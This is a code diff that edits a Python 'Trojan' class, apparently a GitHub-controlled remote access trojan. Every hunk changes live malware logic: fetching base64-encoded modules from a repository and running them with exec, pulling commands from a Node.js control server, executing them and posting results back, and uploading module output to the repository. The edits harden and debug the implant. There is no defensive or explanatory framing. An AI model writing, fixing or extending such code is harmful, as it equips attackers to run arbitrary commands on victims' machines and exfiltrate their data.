@@ -36,12 +36,13 @@ class Trojan:
 
     def get_github_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
-        return json.loads(base64.b64decode(config_json)) if config_json else {}
+        if config_json:
+            return json.loads(base64.b64decode(config_json).decode('utf-8'))
+        return {}
 
     def get_nodejs_config(self):
         try:
             response = requests.get(f"{self.node_server_url}/config")
-            response.raise_for_status()
             return response.json()
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to get config from Node.js server: {e}")
@@ -49,14 +50,20 @@ class Trojan:
 
     def send_command_result(self, command, result):
         try:
-            payload = {"command": command, "result": result}
+            payload = {
+                "command": command,
+                "result": result
+            }
             requests.post(f"{self.node_server_url}/command", json=payload)
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to send command result to Node.js server: {e}")
 
     def update_status(self, status):
         try:
-            payload = {"id": self.id, "status": status}
+            payload = {
+                "id": self.id,
+                "status": status
+            }
             requests.post(f"{self.node_server_url}/status", json=payload)
         except requests.exceptions.RequestException as e:
             print(f"[*] Failed to update status on Node.js server: {e}")
@@ -70,6 +77,7 @@ class Trojan:
         self.send_command_result(command, result)
 
     def module_runner(self, module_name):
+        print(f"[*] Attempting to run module '{module_name}'")
         if module_name in sys.modules:
             try:
                 result = sys.modules[module_name].run()
@@ -79,14 +87,15 @@ class Trojan:
             except Exception as e:
                 print(f"[*] Error running module '{module_name}': {e}")
         else:
-            print(f"[*] Module '{module_name}' not loaded. Trying to load it now...")
-            # Attempt to load the module
+            print(f"[*] Module '{module_name}' not found in sys.modules. Trying to load it now...")
             importlib.invalidate_caches()
             try:
                 module_code = get_file_contents('modules', f'{module_name}.py', self.repo)
                 if module_code:
-                    exec(base64.b64decode(module_code), globals())
+                    print(f"[*] Module code retrieved successfully for '{module_name}'")
+                    exec(base64.b64decode(module_code).decode('utf-8'), globals())
                     if module_name in sys.modules:
+                        print(f"[*] Module '{module_name}' successfully loaded and running...")
                         result = sys.modules[module_name].run()
                         self.store_module_result(result)
                     else:
@@ -100,10 +109,7 @@ class Trojan:
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
-        try:
-            self.repo.create_file(remote_path, message, bindata)
-        except github3.exceptions.GitHubError as e:
-            print(f"[*] Failed to store module result: {e}")
+        self.repo.create_file(remote_path, message, bindata)
 
     def run(self):
         while self.running:
@@ -123,17 +129,14 @@ class Trojan:
                 for command in nodejs_config.get('commands', []):
                     if isinstance(command, str):
                         self.execute_command(command)
-                    elif isinstance(command, dict) and 'module' in command:
-                        module_name = command['module']
-                        self.module_runner(module_name)
+                    elif isinstance(command, dict):
+                        module = command.get('module')
+                        if module:
+                            self.module_runner(module)
 
             # Run modules based on GitHub config
             for task in github_config.get('modules', []):
-                module_name = task['module']
-                if module_name not in sys.modules:
-                    print(f"[*] Module '{module_name}' not found in sys.modules. Loading it now...")
-                    self.module_runner(module_name)
-                thread = threading.Thread(target=self.module_runner, args=(module_name,))
+                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                 thread.start()
                 time.sleep(random.randint(1, 10))
 
@@ -149,7 +152,7 @@ class GitImporter:
         try:
             new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
             if new_library:
-                self.current_module_code = base64.b64decode(new_library)
+                self.current_module_code = base64.b64decode(new_library).decode('utf-8')
                 return importlib.util.spec_from_loader(fullname, loader=self)
         except github3.exceptions.NotFoundError:
             print(f"[*] Module {fullname} not found in repository.")
